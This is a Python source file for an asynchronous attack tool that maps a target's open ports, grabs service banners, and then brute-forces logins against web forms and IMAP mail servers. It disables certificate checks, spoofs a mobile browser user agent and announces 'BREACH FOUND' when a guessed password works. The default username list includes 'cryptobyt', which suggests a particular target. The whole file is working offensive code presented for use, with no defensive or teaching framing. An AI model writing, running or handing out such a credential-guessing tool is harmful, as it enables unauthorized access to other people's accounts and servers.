import asyncio
import socket
import ssl
import time
import sys
import urllib.parse
import http.client

# Global high-performance SSL context
_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

# Comprehensive port profile for full-stack attack surface mapping
TARGET_PORTS = {
    80: "HTTP",
    443: "HTTPS",
    21: "FTP",
    22: "SSH",
    25: "SMTP",
    110: "POP3",
    143: "IMAP",
    465: "SMTPS",
    587: "Submission",
    993: "IMAPS",
    995: "POP3S"
}

async def probe_port(host, port, timeout=1.5):
    """Asynchronously checks open status and grabs the service banner."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port),
            timeout=timeout
        )
        banner = b""
        try:
            banner = await asyncio.wait_for(reader.readline(), timeout=0.8)
        except asyncio.TimeoutError:
            pass
        writer.close()
        await writer.wait_closed()
        return port, banner
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
        return None, None

async def discover_attack_surface(host):
    """Maps all active entry points across the target IP."""
    print(f"\n\033[95m[*] Initiating full-spectrum port discovery on {host}...\033[0m")
    tasks = [probe_port(host, port) for port in TARGET_PORTS.keys()]
    results = await asyncio.gather(*tasks)
    
    open_vectors = []
    for port, banner in results:
        if port is not None:
            service = TARGET_PORTS.get(port, "UNKNOWN")
            banner_str = banner.decode(errors="ignore").strip()
            print(f" \033[92m[+] OPEN VECTOR -> Port {port} ({service}) | Banner: {banner_str[:35]}\033[0m")
            open_vectors.append({"port": port, "service": service, "banner": banner_str})
    return open_vectors

def http_post_sync(host, port, path, username, password, use_ssl):
    """Synchronous worker helper for HTTP form brute-forcing."""
    try:
        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=3.0) if use_ssl else http.client.HTTPConnection(host, port, timeout=3.0)
        payload = urllib.parse.urlencode({"username": username, "email": username, "password": password})
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"
        }
        conn.request("POST", path, payload, headers)
        resp = conn.getresponse()
        body = resp.read().decode(errors="ignore")
        conn.close()
        return resp.status, body
    except Exception:
        return 0, ""

async def test_imap_auth(host, port, user, password, semaphore, results):
    """Asynchronous IMAP / IMAPS brute-force worker."""
    async with semaphore:
        start = time.time()
        try:
            use_ssl = (port in [993, 465])
            conn = asyncio.open_connection(host, port, ssl=_ssl_context if use_ssl else None)
            reader, writer = await asyncio.wait_for(conn, timeout=3.5)

            await asyncio.wait_for(reader.readline(), timeout=1.5)
            writer.write(f'A001 LOGIN "{user}" "{password}"\r\n'.encode())
            await writer.drain()

            response = await asyncio.wait_for(reader.readline(), timeout=2.5)
            writer.close()
            await writer.wait_closed()

            elapsed = time.time() - start
            sys.stdout.write(f"\r\033[K\033[36m[IMAP SCAN] :{port} -> Trying [{user}:{password:<12}]\033[0m")
            sys.stdout.flush()

            if b"OK" in response:
                print(f"\n\033[92m[+] IMAP BREACH FOUND [Elapsed: {elapsed:.2f}s] -> User: {user} | Pass: {password} (Port {port})\033[0m")
                results.append({"type": "IMAP", "port": port, "user": user, "password": password})
        except Exception:
            pass

async def test_http_auth(host, port, path, user, password, semaphore, results):
    """Asynchronous HTTP form brute-force worker."""
    async with semaphore:
        use_ssl = (port == 443)
        start = time.time()
        status, body = await asyncio.to_thread(http_post_sync, host, port, path, user, password, use_ssl)
        
        elapsed = time.time() - start
        sys.stdout.write(f"\r\033[K\033[90m[WEB SCAN] :{port}{path} -> Trying [{user}:{password:<12}] | Code: {status}\033[0m")
        sys.stdout.flush()

        if status in [302, 303] or (status == 200 and ("token" in body.lower() or "success" in body.lower() or "dashboard" in body.lower())):
            print(f"\n\033[92m[+] WEB BREACH FOUND [Status: {status} | Elapsed: {elapsed:.2f}s] -> User: {user} | Pass: {password} (Port {port}{path})\033[0m")
            results.append({"type": "HTTP_FORM", "port": port, "path": path, "user": user, "password": password})

async def run_autonomous_engine(target_host, passwords, usernames=["admin", "operator", "root", "cryptobyt", "support", "test"]):
    """Orchestrates simultaneous multi-vector scanning and password testing."""
    try:
        resolved_ip = socket.gethostbyname(target_host)
        print(f"\n\033[96m[*] Target Target Resolved: {target_host} -> {resolved_ip}\033[0m")
    except socket.gaierror:
        print(f"\n\033[91m[!] Error: Unable to resolve hostname '{target_host}'.\033[0m")
        return [], 0

    start_global = time.time()
    open_vectors = await discover_attack_surface(resolved_ip)

    if not open_vectors:
        print(f"\n\033[91m[-] Target surface is heavily locked down. No open vectors identified.\033[0m")
        return [], time.time() - start_global

    print(f"\n\033[93m[*] Deploying multi-vector asynchronous execution workers...\033[0m")
    semaphore = asyncio.Semaphore(35) # High concurrency balance for mobile terminals
    results = []
    tasks = []

    web_paths = ["/api/auth/login", "/login", "/signin", "/auth", "/api/login"]

    for vector in open_vectors:
        port = vector["port"]
        
        # Vector A: Web Forms (Ports 80 / 443)
        if port in [80, 443]:
            for path in web_paths:
                for user in usernames:
                    for pwd in passwords:
                        tasks.append(test_http_auth(resolved_ip, port, path, user, pwd, semaphore, results))
                        
        # Vector B: Mail / IMAP Servers (Ports 143 / 993)
        elif port in [143, 993]:
            for user in usernames:
                for pwd in passwords:
                    tasks.append(test_imap_auth(resolved_ip, port, user, pwd, semaphore, results))

    if tasks:
        print(f"[*] Firing {len(tasks)} concurrent payload attempts across active vectors...\n")
        await asyncio.gather(*tasks)
    else:
        print(f"\n\033[93m[*] Open ports detected, but no matching exploitation modules mapped for these services.\033[0m")

    duration = time.time() - start_global
    return results, duration
